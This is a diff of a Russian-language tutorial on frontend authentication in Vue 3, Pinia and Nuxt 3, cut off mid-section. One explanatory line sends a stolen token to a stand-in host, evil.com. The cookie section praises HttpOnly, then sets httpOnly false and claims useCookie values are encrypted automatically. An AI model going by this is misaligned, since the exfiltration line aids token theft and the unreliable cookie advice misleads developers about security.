@@ -1,4 +1,4 @@
-# 📚 Frontend Auth - Теория
+# 📚 День 1: Frontend Аутентификация - Теория
 
 > **Перед практикой**: Изучи эти концепции, чтобы понимать что делаешь!
 
@@ -6,272 +6,254 @@
 
 ## 🎯 Содержание
 
-1. [Pinia - State Management](#1-pinia---state-management)
-2. [Composition API (script setup)](#2-composition-api-script-setup)
-3. [TypeScript интерфейсы](#3-typescript-интерфейсы)
-4. [Reactivity (ref, computed)](#4-reactivity-ref-computed)
-5. [Composables](#5-composables)
-6. [Nuxt Pages и Middleware](#6-nuxt-pages-и-middleware)
-7. [Service Layer Pattern](#7-service-layer-pattern)
+1. [TypeScript - Типизация](#1-typescript---типизация)
+2. [Vue 3 Composition API](#2-vue-3-composition-api)
+3. [Pinia Store - State Management](#3-pinia-store---state-management)
+4. [Nuxt 3 Cookies - Безопасное хранение](#4-nuxt-3-cookies---безопасное-хранение)
+5. [Service Layer Pattern](#5-service-layer-pattern)
+6. [Composables - Переиспользуемая логика](#6-composables---переиспользуемая-логика)
+7. [Middleware - Защита маршрутов](#7-middleware---защита-маршрутов)
+8. [Компонентная архитектура](#8-компонентная-архитектура)
 
 ---
 
-## 1. Pinia - State Management
+## 1. TypeScript - Типизация
 
-### Что такое Pinia?
+### Что такое TypeScript?
 
-**Pinia** - это библиотека для управления состоянием (state management) в Vue.js приложениях.
+**TypeScript** - это надстройка над JavaScript, добавляющая статическую типизацию.
 
-**Простыми словами**: Это **общее хранилище данных**, к которому могут обращаться все компоненты.
+**Зачем нужен:**
+- 🔍 **Автодополнение** - IDE подсказывает методы и свойства
+- 🐛 **Ловит ошибки** на этапе разработки, а не в production
+- 📖 **Документация** - типы показывают что ожидается
+- 🔄 **Рефакторинг** - безопасно менять код
 
-### Зачем нужна Pinia?
+### Interface - Описание структуры
 
-**Проблема без Pinia**:
-```vue
-<!-- LoginPage.vue -->
-<script setup>
-const user = { name: 'John' }
-// user доступен ТОЛЬКО в LoginPage
-</script>
+**Interface** - контракт, описывающий форму объекта.
 
-<!-- ProfilePage.vue -->
-<script setup>
-// Как получить user из LoginPage? 🤔
-// Нужно передавать через props по всей цепочке компонентов
-</script>
-```
-
-**Решение с Pinia**:
 ```typescript
-// stores/auth.ts - ОБЩЕЕ хранилище
-const user = { name: 'John' }
+// Определение интерфейса
+interface User {
+  _id: string          // Обязательное поле
+  name: string         // Обязательное поле
+  email: string        // Обязательное поле
+  avatar?: string | null  // Опциональное (? = может отсутствовать)
+  status?: string      // Опциональное
+}
 
-// LoginPage.vue
-const authStore = useAuthStore()
-console.log(authStore.user) // { name: 'John' }
-
-// ProfilePage.vue
-const authStore = useAuthStore()
-console.log(authStore.user) // { name: 'John' } - ТОТ ЖЕ user!
+// Использование
+const user: User = {
+  _id: '123',
+  name: 'John',
+  email: 'john@example.com'
+  // avatar и status можно не указывать
+}
 ```
 
-**Преимущества**:
-- ✅ **Централизованное состояние** - одно место для всех данных
-- ✅ **Доступно везде** - любой компонент может обратиться
-- ✅ **Реактивность** - при изменении обновляются все компоненты
-- ✅ **TypeScript поддержка** - автодополнение и проверка типов
-- ✅ **DevTools** - можно видеть и отлаживать состояние
+**Ключевые моменты:**
+- `?` после имени = опциональное поле
+- `| null` = может быть null
+- `string[]` = массив строк
+- `'online' | 'offline'` = только эти значения (union type)
 
-### Когда использовать Pinia?
+### Type - Альтернатива Interface
 
-**Используй Pinia для**:
-- ✅ Авторизация (user, token, isAuthenticated)
-- ✅ Глобальные настройки (theme, language)
-- ✅ Данные которые нужны в разных компонентах
-- ✅ Состояние которое переживает навигацию
+**Type** - более гибкий способ определения типов.
 
-**НЕ используй для**:
-- ❌ Локальное состояние компонента (используй `ref()`)
-- ❌ Временные данные (используй `ref()`)
-- ❌ Данные одной формы (используй `ref()`)
-
-**Пример**:
-```vue
-<!-- Локальное состояние (ref) -->
-<script setup>
-const count = ref(0) // Только для этого компонента
-</script>
-
-<!-- Глобальное состояние (Pinia) -->
-<script setup>
-const authStore = useAuthStore() // Для всего приложения
-</script>
-```
-
----
-
-## 1.1 defineStore - создание Store
-
-### Что такое defineStore?
-
-**`defineStore`** - это функция из Pinia для создания хранилища (store).
-
-**Синтаксис**:
 ```typescript
-import { defineStore } from 'pinia'
+// Union type - "или-или"
+type Status = 'online' | 'offline' | 'away'
 
-export const useAuthStore = defineStore('auth', {
-  // 'auth' - уникальное имя store
-  state: () => ({ /* данные */ }),
-  actions: { /* методы */ },
+// Intersection - объединение типов
+type UserWithStatus = User & { status: Status }
+
+// Function type
+type LoginFunction = (email: string, password: string) => Promise<void>
+```
+
+**Когда использовать:**
+- `interface` - для объектов, которые могут расширяться
+- `type` - для union types, функций, примитивов
+
+### Generics (Дженерики) - `<>`
+
+**Generics** - параметры типов, позволяющие создавать переиспользуемый код для разных типов.
+
+**Простыми словами:** `<>` - это "параметр типа", как параметр функции, но для типов.
+
+#### Аналогия с функциями
+
+```typescript
+// Обычная функция - параметр ЗНАЧЕНИЯ
+function print(value: string) {
+  console.log(value)
+}
+print("Hello")  // Передаем значение
+
+// Generic функция - параметр ТИПА
+function print<T>(value: T) {
+  console.log(value)
+}
+print<string>("Hello")  // Передаем ТИП через <>
+print<number>(123)      // Другой тип
+```
+
+#### Зачем нужны Generics?
+
+**Без Generics (дублирование):**
+```typescript
+function printString(value: string) { console.log(value) }
+function printNumber(value: number) { console.log(value) }
+function printUser(value: User) { console.log(value) }
+```
+
+**С Generics (переиспользование):**
+```typescript
+function print<T>(value: T) {
+  console.log(value)
+}
+// Одна функция для всех типов!
+```
+
+#### Встроенные Generic типы
+
+```typescript
+// Array<T>
+const numbers: Array<number> = [1, 2, 3]
+const strings: Array<string> = ['a', 'b']
+
+// Promise<T>
+async function fetchUser(): Promise<User> {
+  return await fetch('/api/user').then(r => r.json())
+}
+
+// Record<K, V> - объект с ключами K и значениями V
+const scores: Record<string, number> = {
+  alice: 100,
+  bob: 95
+}
+```
+
+#### Generics в Vue 3
+
+```typescript
+// ref<T>
+const count = ref<number>(0)
+const user = ref<User | null>(null)
+
+// computed<T>
+const fullName = computed<string>(() => {
+  return `${firstName.value} ${lastName.value}`
 })
+
+// defineProps<T>
+interface Props {
+  modelValue: string
+  type?: string
+}
+const props = defineProps<Props>()
+// TypeScript знает: props.modelValue - это string
+
+// defineEmits<T>
+const emit = defineEmits<{
+  'update:modelValue': [value: string]
+  'click': []
+}>()
+emit('update:modelValue', 'text')  // ✅ OK
+emit('update:modelValue', 123)     // ❌ ОШИБКА!
 ```
 
-### Анатомия Store
+#### Создание своих Generic функций
 
 ```typescript
-export const useAuthStore = defineStore('auth', {
-  // 1. STATE - данные (как data в Options API)
-  state: () => ({
-    user: null,      // Текущий пользователь
-    token: null,     // JWT токен
-    isAuthenticated: false,
-  }),
+// Функция возвращает первый элемент массива
+function first<T>(array: T[]): T {
+  return array[0]
+}
 
-  // 2. GETTERS - вычисляемые значения (как computed)
-  getters: {
-    userName: (state) => state.user?.name || 'Гость',
-  },
+const num = first<number>([1, 2, 3])    // num: number
+const str = first<string>(['a', 'b'])  // str: string
 
-  // 3. ACTIONS - методы для изменения state (как methods)
-  actions: {
-    async login(email, password) {
-      // Логика входа
-      this.user = { name: 'John' }
-      this.isAuthenticated = true
-    },
-    
-    logout() {
-      this.user = null
-      this.isAuthenticated = false
-    },
-  },
-})
+// TypeScript может вывести тип автоматически
+const num2 = first([1, 2, 3])  // num2: number
 ```
 
-### State
-
-**State** - это данные, которые хранит store.
+#### Generic интерфейсы
 
 ```typescript
-state: () => ({
-  user: null,           // Объект пользователя
-  token: null,          // Строка токена
-  isAuthenticated: false, // Булево значение
-  loading: false,
+// Интерфейс с параметром типа
+interface ApiResponse<T> {
+  data: T
+  error: string | null
+  loading: boolean
+}
+
+// Использование
+const userResponse: ApiResponse<User> = {
+  data: { _id: '123', name: 'John', email: 'john@example.com' },
   error: null,
+  loading: false
+}
+
+const usersResponse: ApiResponse<User[]> = {
+  data: [user1, user2],
+  error: null,
+  loading: false
+}
+```
+
+#### Практические примеры
+
+**1. API запросы:**
+```typescript
+// $fetch<T> - указываем тип ответа
+const response = await $fetch<AuthResponse>('/auth/login', {
+  method: 'POST',
+  body: credentials
 })
+// response.accessToken - TypeScript знает это поле
 ```
 
-**Почему функция `() => ({ ... })`?**
-- Чтобы каждый store имел свои данные
-- Избегаем проблем с shared state
-
-### Actions
-
-**Actions** - это методы для изменения state.
-
+**2. Store:**
 ```typescript
-actions: {
-  // Обычный метод
-  setUser(user) {
-    this.user = user  // this = state
-  },
+// ref<T> - тип значения внутри ref
+const user = ref<User | null>(null)
+const items = ref<string[]>([])
 
-  // Async метод (для API вызовов)
-  async fetchUser() {
-    this.loading = true
-    try {
-      const user = await api.getUser()
-      this.user = user
-    } catch (err) {
-      this.error = err.message
-    } finally {
-      this.loading = false
-    }
-  },
-}
+user.value = { _id: '123', name: 'John', email: 'john@example.com' }  // ✅
+user.value = "text"  // ❌ ОШИБКА!
 ```
 
-**Ключевые моменты**:
-- Используй `this` для доступа к state
-- Можно делать async/await
-- Можно вызывать другие actions
-
-### Getters (опционально)
-
-**Getters** - это вычисляемые значения (computed).
-
+**3. Компоненты:**
 ```typescript
-getters: {
-  // Простой getter
-  userName: (state) => state.user?.name || 'Гость',
-  
-  // Getter с другим getter
-  greeting(): string {
-    return `Привет, ${this.userName}!`
-  },
+interface Props {
+  items: string[]
+  selected?: number
 }
+
+// <Props> - TypeScript проверяет props
+const props = defineProps<Props>()
+console.log(props.items)     // ✅ string[]
+console.log(props.unknown)   // ❌ ОШИБКА!
 ```
+
+**Ключевые моменты:**
+- `<T>` - параметр типа (T - convention, можно любое имя)
+- Generics = переиспользование кода с разными типами
+- TypeScript проверяет типы на этапе компиляции
+- Автодополнение работает благодаря Generics
 
 ---
 
-## 1.2 Использование Store в компонентах
-
-### Как использовать?
-
-```vue
-<script setup lang="ts">
-// 1. Импортировать store
-import { useAuthStore } from '~/stores/auth'
-
-// 2. Создать экземпляр
-const authStore = useAuthStore()
-
-// 3. Читать state
-console.log(authStore.user)
-console.log(authStore.isAuthenticated)
-
-// 4. Вызывать actions
-authStore.login('email@example.com', 'password')
-authStore.logout()
-</script>
-
-<template>
-  <!-- 5. Использовать в template -->
-  <div v-if="authStore.isAuthenticated">
-    Welcome, {{ authStore.user.name }}!
-  </div>
-  
-  <button @click="authStore.logout()">
-    Выйти
-  </button>
-</template>
-```
-
-### Реактивность
-
-**Важно**: Store реактивен! При изменении state → UI обновляется автоматически.
-
-```vue
-<script setup>
-const authStore = useAuthStore()
-
-// Изменим state через action
-const handleLogin = async () => {
-  await authStore.login(email, password)
-  // После login() state изменится
-  // И UI обновится автоматически!
-}
-</script>
-
-<template>
-  <!-- Автоматически обновится когда изменится isAuthenticated -->
-  <div v-if="authStore.isAuthenticated">
-    Вы вошли!
-  </div>
-</template>
-```
-
----
-
-## 2. Composition API (script setup)
+## 2. Vue 3 Composition API
 
 ### Что такое Composition API?
 
-**Composition API** - это новый способ писать компоненты в Vue 3.
+**Composition API** - новый способ организации логики в Vue 3 компонентах.
 
-**Options API** (старый, НЕ используем):
+**Старый способ (Options API)** - НЕ используем:
 ```vue
 <script>
 export default {
@@ -279,172 +261,66 @@ export default {
     return { count: 0 }
   },
   methods: {
-    increment() {
-      this.count++
-    }
+    increment() { this.count++ }
   }
 }
 </script>
 ```
 
-**Composition API** (новый, используем):
+**Новый способ (Composition API)** - используем:
 ```vue
-<script setup>
+<script setup lang="ts">
 import { ref } from 'vue'
 
 const count = ref(0)
-const increment = () => {
-  count.value++
-}
+const increment = () => count.value++
 </script>
 ```
 
-### Зачем script setup?
+### `<script setup>` - Синтаксический сахар
 
-- ✅ **Короче** - меньше кода
-- ✅ **Понятнее** - всё последовательно сверху вниз
-- ✅ **TypeScript** - лучшая поддержка типов
-- ✅ **Производительность** - быстрее компилируется
+**`<script setup>`** - упрощенный синтаксис Composition API.
 
-### Базовый синтаксис
+**Преимущества:**
+- ✅ Меньше boilerplate кода
+- ✅ Всё автоматически доступно в template
+- ✅ Лучшая производительность
+- ✅ Лучшая поддержка TypeScript
 
 ```vue
 <script setup lang="ts">
-// 1. Импорты
-import { ref, computed } from 'vue'
-
-// 2. Reactive переменные
+// Всё что объявлено здесь - доступно в template
+const message = 'Hello'
 const count = ref(0)
-const doubled = computed(() => count.value * 2)
-
-// 3. Функции
-const increment = () => {
-  count.value++
-}
-
-// 4. Всё автоматически доступно в template!
+const increment = () => count.value++
 </script>
 
 <template>
-  <div>
-    <p>Count: {{ count }}</p>
-    <p>Doubled: {{ doubled }}</p>
-    <button @click="increment">+1</button>
-  </div>
+  <p>{{ message }}</p>
+  <p>{{ count }}</p>
+  <button @click="increment">+1</button>
 </template>
 ```
 
-**Ключевые моменты**:
-- Нет `export default`
-- Всё объявленное доступно в template
-- TypeScript через `lang="ts"`
+### ref() - Реактивная переменная
 
----
-
-## 3. TypeScript интерфейсы
-
-### Что такое interface?
-
-**Interface** - это описание структуры объекта в TypeScript.
-
-**Без интерфейса** (плохо):
-```typescript
-const user = {
-  name: 'John',
-  email: 'john@example.com',
-  age: 25,
-}
-
-// TypeScript не знает какие поля есть
-// Можно случайно написать user.nam (опечатка)
-```
-
-**С интерфейсом** (хорошо):
-```typescript
-interface User {
-  name: string
-  email: string
-  age: number
-}
-
-const user: User = {
-  name: 'John',
-  email: 'john@example.com',
-  age: 25,
-}
-
-// TypeScript знает структуру
-// user.nam - ошибка компиляции!
-// user.name - автодополнение работает!
-```
-
-### Синтаксис
-
-```typescript
-interface User {
-  // Обязательные поля
-  _id: string
-  name: string
-  email: string
-  
-  // Опциональные поля (могут отсутствовать)
-  avatar?: string  // ? = опциональное
-  phone?: string
-  
-  // Типы
-  age: number              // Число
-  isActive: boolean        // true/false
-  roles: string[]          // Массив строк
-  createdAt: Date          // Дата
-  metadata: object         // Объект
-  status: 'online' | 'offline' // Только эти значения
-}
-```
-
-### Использование
-
-```typescript
-// Типизация переменной
-const user: User = {
-  _id: '123',
-  name: 'John',
-  email: 'john@example.com',
-}
-
-// Типизация функции
-function greet(user: User): string {
-  return `Hello, ${user.name}!`
-}
-
-// Типизация массива
-const users: User[] = [user1, user2]
-```
-
-### Зачем нужны?
-
-- ✅ **Автодополнение** - IDE подсказывает поля
-- ✅ **Проверка типов** - ловит ошибки до запуска
-- ✅ **Документация** - видно какие поля есть
-- ✅ **Рефакторинг** - безопасно менять код
-
----
-
-## 4. Reactivity (ref, computed)
-
-### ref() - реактивная переменная
-
-**`ref()`** - создаёт реактивную переменную, при изменении которой обновляется UI.
+**`ref()`** - создает реактивную ссылку на значение.
 
 ```vue
 <script setup>
 import { ref } from 'vue'
 
-// Создать реактивную переменную
+// Создание ref
 const count = ref(0)
 
-// Изменить значение (используй .value)
+// Чтение/запись в script (через .value)
+console.log(count.value) // 0
+count.value = 5
+count.value++
+
+// Функция изменения
 const increment = () => {
-  count.value++  // .value обязателен в script
+  count.value++  // .value обязателен!
 }
 </script>
 
@@ -455,14 +331,36 @@ const increment = () => {
 </template>
 ```
 
-**Ключевые моменты**:
+**Важно:**
 - В `<script>` используй `.value`
 - В `<template>` НЕ используй `.value`
 - При изменении → UI обновляется автоматически
 
-### computed() - вычисляемое значение
+### reactive() - Реактивный объект
 
-**`computed()`** - создаёт значение которое пересчитывается при изменении зависимостей.
+**`reactive()`** - создает реактивный объект.
+
+```typescript
+import { reactive } from 'vue'
+
+// Для объектов
+const form = reactive({
+  email: '',
+  password: ''
+})
+
+// Изменение (без .value)
+form.email = 'test@example.com'
+form.password = '123456'
+```
+
+**Когда использовать:**
+- `ref()` - для примитивов (string, number, boolean)
+- `reactive()` - для объектов с несколькими полями
+
+### computed() - Вычисляемое свойство
+
+**`computed()`** - создает вычисляемое значение с кешированием.
 
 ```vue
 <script setup>
@@ -471,263 +369,748 @@ import { ref, computed } from 'vue'
 const firstName = ref('John')
 const lastName = ref('Doe')
 
-// Вычисляемое значение
+// Вычисляется автоматически при изменении зависимостей
 const fullName = computed(() => {
   return `${firstName.value} ${lastName.value}`
 })
 
 // Изменим firstName
 firstName.value = 'Jane'
-// fullName автоматически пересчитается: "Jane Doe"
+// fullName автоматически = "Jane Doe"
 </script>
 
 <template>
-  <p>{{ fullName }}</p> <!-- Jane Doe -->
+  <p>{{ fullName }}</p>
 </template>
 ```
 
-**Зачем computed?**:
+**Зачем computed:**
 - ✅ **Кеширование** - пересчитывается только при изменении зависимостей
-- ✅ **Чистота** - логика в одном месте
-- ✅ **Производительность** - не пересчитывается каждый рендер
+- ✅ **Производительность** - не вызывается каждый рендер
+- ✅ **Чистота кода** - логика в одном месте
 
-**Разница ref vs computed**:
+**Разница ref vs computed:**
+```typescript
+// ref - хранит значение (можно менять)
+const count = ref(0)
+count.value = 5  // ✅ OK
+
+// computed - вычисляет значение (только чтение)
+const doubled = computed(() => count.value * 2)
+doubled.value = 10  // ❌ ОШИБКА!
+```
+
+### watch() - Отслеживание изменений
+
+**`watch()`** - выполняет код при изменении значения.
 
 ```typescript
-// ref - для хранения значения
-const count = ref(0)
-count.value = 5  // Можно изменять
+import { ref, watch } from 'vue'
 
-// computed - для вычисления
-const doubled = computed(() => count.value * 2)
-doubled.value = 10  // ❌ ОШИБКА! Нельзя изменять напрямую
+const email = ref('')
+
+// Следим за изменениями email
+watch(email, (newValue, oldValue) => {
+  console.log(`Email changed from ${oldValue} to ${newValue}`)
+})
+
+// Следим за несколькими значениями
+watch([email, password], ([newEmail, newPass]) => {
+  console.log('Form changed')
+})
 ```
 
 ---
 
-## 5. Composables
+## 3. Pinia Store - State Management
+
+### Что такое Pinia?
+
+**Pinia** - библиотека для управления глобальным состоянием в Vue.js.
+
+**Простыми словами:** Общее хранилище данных, доступное всем компонентам.
+
+### Зачем нужна Pinia?
+
+**Проблема без Pinia:**
+```vue
+<!-- LoginPage.vue -->
+<script setup>
+const user = { name: 'John' }
+// user доступен ТОЛЬКО здесь
+</script>
+
+<!-- ProfilePage.vue -->
+<script setup>
+// Как получить user из LoginPage? 🤔
+// Нужно передавать через props по всей цепочке
+</script>
+```
+
+**Решение с Pinia:**
+```typescript
+// stores/auth.ts - ОБЩЕЕ хранилище
+const user = { name: 'John' }
+
+// LoginPage.vue
+const authStore = useAuthStore()
+console.log(authStore.user) // { name: 'John' }
+
+// ProfilePage.vue  
+const authStore = useAuthStore()
+console.log(authStore.user) // ТОТ ЖЕ user!
+```
+
+### defineStore() - Создание Store
+
+**`defineStore()`** - функция для создания хранилища.
+
+```typescript
+import { defineStore } from 'pinia'
+
+export const useAuthStore = defineStore('auth', () => {
+  // 1. STATE - реактивные данные
+  const user = ref<User | null>(null)
+  const accessToken = ref<string | null>(null)
+  const loading = ref(false)
+  const error = ref<string | null>(null)
+  
+  // 2. GETTERS - вычисляемые значения
+  const isAuthenticated = computed(() => 
+    !!user.value && !!accessToken.value
+  )
+  
+  // 3. ACTIONS - методы
+  async function login(credentials: LoginCredentials) {
+    loading.value = true
+    try {
+      const response = await authService.login(credentials)
+      user.value = response.user
+      accessToken.value = response.accessToken
+    } finally {
+      loading.value = false
+    }
+  }
+  
+  // 4. RETURN - что доступно снаружи
+  return {
+    user,
+    accessToken,
+    loading,
+    error,
+    isAuthenticated,
+    login
+  }
+})
+```
+
+**Composition API стиль (используем):**
+- Используем `ref()`, `computed()` как обычно
+- Возвращаем что нужно экспортировать
+- Более гибкий и понятный
+
+### Использование Store
+
+```vue
+<script setup lang="ts">
+import { useAuthStore } from '~/stores/auth'
+
+// Получить store
+const authStore = useAuthStore()
+
+// Читать state
+console.log(authStore.user)
+console.log(authStore.isAuthenticated)
+
+// Вызывать actions
+await authStore.login({ email, password })
+authStore.logout()
+</script>
+
+<template>
+  <div v-if="authStore.isAuthenticated">
+    Welcome, {{ authStore.user?.name }}!
+  </div>
+</template>
+```
+
+---
+
+## 4. Nuxt 3 Cookies - Безопасное хранение
+
+### Проблема localStorage
+
+**localStorage** - небезопасен для хранения токенов!
+
+**Уязвимости:**
+- ❌ **XSS атаки** - вредоносный JS может украсть токен
+- ❌ **Доступен из любого скрипта**
+- ❌ **Нет защиты от CSRF**
+
+```javascript
+// Любой скрипт может украсть токен
+const token = localStorage.getItem('token')
+fetch('https://evil.com/steal', { body: token })
+```
+
+### Решение: HttpOnly Cookies
+
+**HttpOnly Cookies** - безопасный способ хранения токенов.
+
+**Преимущества:**
+- ✅ **Недоступны для JavaScript** (защита от XSS)
+- ✅ **Автоматически отправляются** с запросами
+- ✅ **Secure флаг** - только HTTPS
+- ✅ **SameSite** - защита от CSRF
+- ✅ **Шифрование** - Nuxt автоматически шифрует
+
+### useCookie() - Nuxt 3 API
+
+**`useCookie()`** - composable для работы с cookies в Nuxt.
+
+```typescript
+// Создание cookie
+const tokenCookie = useCookie('auth_token', {
+  maxAge: 60 * 60 * 24 * 7,  // 7 дней
+  secure: true,               // Только HTTPS (в production)
+  sameSite: 'strict',         // CSRF защита
+  httpOnly: false             // Nuxt cookies шифруются автоматически
+})
+
+// Запись
+tokenCookie.value = 'jwt_token_here'
+
+// Чтение
+const token = tokenCookie.value
+
+// Удаление
+tokenCookie.value = null
+```
+
+**Параметры:**
+- `maxAge` - время жизни в секундах
+- `secure` - только HTTPS (true в production)
+- `sameSite` - защита от CSRF ('strict', 'lax', 'none')
+- `httpOnly` - недоступен для JS (в Nuxt всегда false, но шифруется)
+
+### Шифрование Cookies
+
+**Nuxt автоматически шифрует cookies** если установлен `NUXT_SESSION_PASSWORD`.
+
+```bash
+# .env
+NUXT_SESSION_PASSWORD=your-secret-key-min-32-chars
+```
+
+**Как работает:**
+1. Nuxt берет значение cookie
+2. Шифрует его с помощью секретного ключа
+3. Сохраняет зашифрованное значение
+4. При чтении - автоматически расшифровывает
+
+**Безопасность:**
+- Даже если злоумышленник украдет cookie - он зашифрован
+- Без секретного ключа невозможно расшифровать
+- Ключ хранится только на сервере
+
+---
+
+## 5. Service Layer Pattern
+
+### Что такое Service Layer?
+
+**Service Layer** - слой который изолирует API вызовы от компонентов.
+
+**Архитектура:**
+```
+Component (UI)
+    ↓
+Composable (Facade)
+    ↓
+Store (State)
+    ↓
+Service (API) ← Изолированный слой
+    ↓
+Backend API
+```
+
+### Зачем нужен?
+
+**Без Service Layer (плохо):**
+```vue
+<script setup>
+// API логика прямо в компоненте
+const login = async () => {
+  const response = await fetch('http://localhost:3001/auth/login', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ email, password })
+  })
+  const data = await response.json()
+  // Обработка...
+}
+</script>
+```
+
+**С Service Layer (хорошо):**
+```typescript
+// services/api/auth.service.ts
+export async function login(credentials: LoginCredentials) {
+  const response = await $fetch('/auth/login', {
+    method: 'POST',
+    body: credentials
+  })
+  return {
+    user: response.user,
+    accessToken: response.access_token  // Маппинг
+  }
+}
+```
+
+```vue
+<script setup>
+import * as authService from '~/services/api/auth.service'
+
+const login = async () => {
+  const data = await authService.login({ email, password })
+  // Чисто и понятно!
+}
+</script>
+```
+
+**Преимущества:**
+- ✅ **Изоляция** - API логика в одном месте
+- ✅ **Переиспользование** - один сервис для всех
+- ✅ **Тестируемость** - легко мокировать
+- ✅ **Маппинг** - преобразование данных backend → frontend
+- ✅ **Обработка ошибок** - централизованная
+
+### Маппинг данных
+
+**Backend возвращает:**
+```json
+{
+  "access_token": "jwt...",
+  "user": { "_id": "123", "name": "John" }
+}
+```
+
+**Frontend ожидает:**
+```typescript
+interface AuthResponse {
+  accessToken: string  // camelCase вместо snake_case
+  user: User
+}
+```
+
+**Service делает маппинг:**
+```typescript
+export async function login(credentials: LoginCredentials): Promise<AuthResponse> {
+  const response = await $fetch<any>('/auth/login', {
+    method: 'POST',
+    body: credentials
+  })
+  
+  // Маппинг: access_token → accessToken
+  return {
+    user: response.user,
+    accessToken: response.access_token
+  }
+}
+```
+
+---
+
+## 6. Composables - Переиспользуемая логика
 
 ### Что такое Composable?
 
-**Composable** - это переиспользуемая функция с реактивной логикой.
+**Composable** - функция которая инкапсулирует и переиспользует реактивную логику.
 
-**Простыми словами**: Функция которая возвращает reactive data и methods.
+**Naming Convention:** Всегда начинается с `use...`
+- `useAuth`, `useUser`, `useCart`, `useForm`
 
-**Зачем**:
-- ✅ Переиспользование логики
-- ✅ Чистый код
-- ✅ Легко тестировать
+### Зачем нужны?
 
-### Пример
-
-**Без Composable** (дублирование):
+**Проблема без Composable:**
 ```vue
 <!-- LoginPage.vue -->
 <script setup>
 const authStore = useAuthStore()
-const login = async (email, password) => {
-  await authStore.login(email, password)
+const router = useRouter()
+
+const login = async (credentials) => {
+  await authStore.login(credentials)
+  await router.push('/')
 }
 </script>
 
 <!-- RegisterPage.vue -->
 <script setup>
 const authStore = useAuthStore()
-const register = async (name, email, password) => {
-  await authStore.register(name, email, password)
+const router = useRouter()
+
+const register = async (data) => {
+  await authStore.register(data)
+  await router.push('/')
 }
 </script>
 ```
 
-**С Composable** (переиспользование):
+**Решение с Composable:**
 ```typescript
 // composables/useAuth.ts
 export const useAuth = () => {
   const authStore = useAuthStore()
+  const router = useRouter()
   
-  const login = async (email, password) => {
-    await authStore.login(email, password)
+  const login = async (credentials: LoginCredentials) => {
+    await authStore.login(credentials)
+    await router.push('/')
   }
   
-  const register = async (name, email, password) => {
-    await authStore.register(name, email, password)
+  const register = async (data: RegisterData) => {
+    await authStore.register(data)
+    await router.push('/')
   }
   
-  return { login, register, user: computed(() => authStore.user) }
+  return {
+    user: computed(() => authStore.user),
+    isAuthenticated: computed(() => authStore.isAuthenticated),
+    loading: computed(() => authStore.loading),
+    error: computed(() => authStore.error),
+    login,
+    register,
+    logout: authStore.logout
+  }
 }
 ```
 
-Использование:
+**Использование:**
 ```vue
-<!-- LoginPage.vue -->
 <script setup>
-const { login, user } = useAuth()
-</script>
+const { login, user, isAuthenticated } = useAuth()
 
-<!-- RegisterPage.vue -->
-<script setup>
-const { register, user } = useAuth()
+const handleLogin = async () => {
+  await login({ email, password })
+  // Автоматический редирект внутри useAuth
+}
 </script>
 ```
 
-### Naming Convention
+### Facade Pattern
 
-- Всегда начинается с `use...`
-- `useAuth`, `useUser`, `useCart`, etc.
+**Composable = Facade** над Store.
+
+**Facade Pattern** - упрощенный интерфейс к сложной системе.
+
+```
+Component
+    ↓
+useAuth (Facade) ← Простой интерфейс
+    ↓
+AuthStore + Router + ... ← Сложная логика
+```
+
+**Преимущества:**
+- ✅ Простой API для компонентов
+- ✅ Скрывает сложность
+- ✅ Легко менять реализацию
+- ✅ Переиспользование логики
 
 ---
 
-## 6. Nuxt Pages и Middleware
+## 7. Middleware - Защита маршрутов
 
-### Nuxt Pages
+### Что такое Middleware?
 
-**Nuxt Pages** - это автоматический роутинг на основе файловой структуры.
+**Middleware** - функция которая выполняется перед переходом на страницу.
 
-```
-pages/
-├── index.vue          → /
-├── login.vue          → /login
-├── register.vue       → /register
-└── profile.vue        → /profile
-```
+**Зачем:** Защита routes от неавторизованных пользователей.
 
-**Навигация**:
-```vue
-<template>
-  <!-- Ссылки -->
-  <NuxtLink to="/">Главная</NuxtLink>
-  <NuxtLink to="/login">Вход</NuxtLink>
-  
-  <!-- Программная навигация -->
-  <button @click="goToProfile">Профиль</button>
-</template>
-
-<script setup>
-const router = useRouter()
-
-const goToProfile = () => {
-  router.push('/profile')
-}
-</script>
-```
-
-### Middleware
-
-**Middleware** - это функция которая выполняется перед переходом на страницу.
-
-**Зачем**: Защита routes от неавторизованных пользователей.
+### defineNuxtRouteMiddleware
 
 ```typescript
 // middleware/auth.ts
-export default defineNuxtRouteMiddleware((to, from) => {
+export default defineNuxtRouteMiddleware(async (to, from) => {
   const authStore = useAuthStore()
   
   // Проверка авторизации
   if (!authStore.isAuthenticated) {
-    return navigateTo('/login') // Редирект
+    // Попытка восстановить сессию из cookie
+    const tokenCookie = useCookie('auth_token')
+    if (tokenCookie.value) {
+      await authStore.restoreSession()
+    }
   }
   
-  // Если авторизован - пропустить
+  // Если всё ещё не авторизован - редирект
+  if (!authStore.isAuthenticated) {
+    return navigateTo('/login')
+  }
 })
 ```
 
-**Использование на странице**:
+**Параметры:**
+- `to` - куда идем (целевой route)
+- `from` - откуда идем (текущий route)
+
+**Возврат:**
+- `undefined` - пропустить (продолжить навигацию)
+- `navigateTo('/path')` - редирект
+
+### Использование на странице
+
 ```vue
-<script setup>
+<script setup lang="ts">
+// Применить middleware к этой странице
 definePageMeta({
-  middleware: ['auth'] // Требует авторизацию
+  middleware: ['auth']  // Требует авторизацию
 })
+
+const { user } = useAuth()
 </script>
 
 <template>
-  <div>Защищённая страница</div>
+  <div>
+    <h1>Защищенная страница</h1>
+    <p>Привет, {{ user?.name }}!</p>
+  </div>
 </template>
+```
+
+### Guest Middleware
+
+**Обратная логика** - для страниц login/register (только для неавторизованных).
+
+```typescript
+// middleware/guest.ts
+export default defineNuxtRouteMiddleware((to, from) => {
+  const authStore = useAuthStore()
+  
+  // Если авторизован - редирект на главную
+  if (authStore.isAuthenticated) {
+    return navigateTo('/')
+  }
+})
+```
+
+```vue
+<!-- pages/login.vue -->
+<script setup>
+definePageMeta({
+  middleware: ['guest']  // Только для неавторизованных
+})
+</script>
 ```
 
 ---
 
-## 7. Service Layer Pattern
+## 8. Компонентная архитектура
 
-### Что такое Service Layer?
+### Принцип DRY (Don't Repeat Yourself)
 
-**Service Layer** - это слой который изолирует API вызовы от компонентов.
+**DRY** - не повторяйся. Один компонент для всех похожих элементов.
 
-**Без Service Layer** (плохо):
+**Плохо (дублирование):**
 ```vue
-<script setup>
-// API вызовы прямо в компоненте
-const login = async () => {
-  const response = await fetch('http://localhost:3001/auth/login', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
